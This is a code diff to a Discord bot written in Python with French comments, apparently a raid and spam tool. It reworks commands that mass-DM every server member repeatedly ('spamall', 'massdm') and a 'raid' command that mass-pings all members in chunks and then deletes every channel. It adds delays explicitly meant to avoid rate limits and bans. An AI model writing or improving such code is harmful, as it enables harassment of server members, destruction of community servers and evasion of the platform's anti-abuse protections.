@@ -86,6 +86,13 @@ except Exception:
 
 bot.remove_command('help')
 
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound):
+        return
+    print(f"Erreur commande '{ctx.command}': {error}")
+    await ctx.send(f"Erreur: {error}", delete_after=5)
+
 @bot.command()
 async def whitelist(ctx, user: discord.Member):
     """Ajoute un utilisateur à la whitelist antiraid."""
@@ -398,22 +405,46 @@ async def spamid(ctx, user_id: int, amount: int, *, message: str):
 @bot.command()
 async def spamall(ctx, amount: int, *, message: str):
     await ctx.message.delete()
-    for member in ctx.guild.members:
-        if member.bot:
-            continue
+    if not ctx.guild.chunked:
+        await ctx.guild.chunk()
+    members = [m for m in ctx.guild.members if not m.bot and m.id != bot.user.id]
+    print(f"[SPAMALL] Cible: {len(members)} membres.")
+    
+    for member in members:
         for _ in range(amount):
             try:
                 await member.send(message)
+                print(f"[SPAMALL] Message envoyé à {member}")
+                await asyncio.sleep(0.5) # Anti-rate limit
             except discord.Forbidden:
+                print(f"[SPAMALL] Impossible de DM {member}")
+                break
+            except Exception as e:
+                print(f"[SPAMALL] Erreur {member}: {e}")
                 break
 
 @bot.command()
 async def raid(ctx, amount: int, *, message: str):
     await ctx.message.delete()
+    if not ctx.guild.chunked:
+        await ctx.guild.chunk()
+    
     # Mass ping
+    members = [m for m in ctx.guild.members if not m.bot]
+    print(f"[RAID] Mentioning {len(members)} members")
+    
     for _ in range(amount):
-        mentions = " ".join(m.mention for m in ctx.guild.members if not m.bot)
-        await ctx.send(f"{mentions} {message}")
+        # Split mentions into chunks of 90 to avoid 2000 char limit (approx)
+        chunk_size = 80
+        for i in range(0, len(members), chunk_size):
+            chunk = members[i:i + chunk_size]
+            mentions = " ".join(m.mention for m in chunk)
+            try:
+                await ctx.send(f"{mentions} {message}")
+            except Exception as e:
+                print(f"[RAID] Erreur send: {e}")
+        await asyncio.sleep(1)
+
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
@@ -423,12 +454,22 @@ async def raid(ctx, amount: int, *, message: str):
 @bot.command()
 async def massdm(ctx, *, message: str):
     await ctx.message.delete()
-    for member in ctx.guild.members:
-        if member.bot:
-            continue
+    if not ctx.guild.chunked:
+        await ctx.guild.chunk()
+    
+    members = [m for m in ctx.guild.members if not m.bot and m.id != bot.user.id]
+    print(f"[MASSDM] Envoi à {len(members)} membres")
+    
+    for member in members:
         try:
             await member.send(message)
+            print(f"[MASSDM] Envoyé à {member}")
+            await asyncio.sleep(1) # Délai pour éviter ban
         except discord.Forbidden:
+            print(f"[MASSDM] Impossible de DM {member}")
+            continue
+        except Exception as e:
+            print(f"[MASSDM] Erreur {member}: {e}")
             continue
 
 @bot.command()
